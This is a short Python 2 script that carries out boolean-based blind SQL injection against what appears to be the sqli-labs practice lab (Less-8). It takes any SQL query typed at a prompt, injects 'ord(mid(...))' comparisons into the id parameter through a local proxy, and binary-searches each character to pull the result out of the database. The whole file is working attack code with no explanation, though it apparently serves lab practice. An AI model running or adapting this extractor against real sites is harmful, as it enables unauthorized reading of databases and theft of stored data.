#-*- coding: UTF-8 -*-
import requests
import string
import re


org_url = "http://mysqlilabs.com/Less-8/index.php?id=1'"
url0 = "+and+length(%s)=%d--+data"
url1 = "+and+ord(mid((%s),%d,1))<%d--+data"
proxies = {"http":"http://127.0.0.1:8080"}

def check(url):
	try:
		r = requests.get(url = url,proxies=proxies)
		if(re.search(r'You are in',r.content)!=None):
			return True
	except Exception, e:
		print e

	return False

if __name__ == "__main__":
	while True:
		query = raw_input("> ")
		query = query.replace(' ','+')


		result = ""
		n=1
		while True:
			flag = False
			left  = 0 
			right = 127
			while True:
				mid = (left + right) / 2
				print("l:%d,m:%d,r:%d"%(left,mid,right))
				if(mid == 0 or mid == 256):
					break
				if(mid == left):
					result += chr(mid)
					flag = True
					print "current result is: " + result
					break
				url = org_url + url1 % (query,n,mid)
				if check(url):
					right = mid
				else:
					left = mid

			if(not flag):
				break
			n += 1

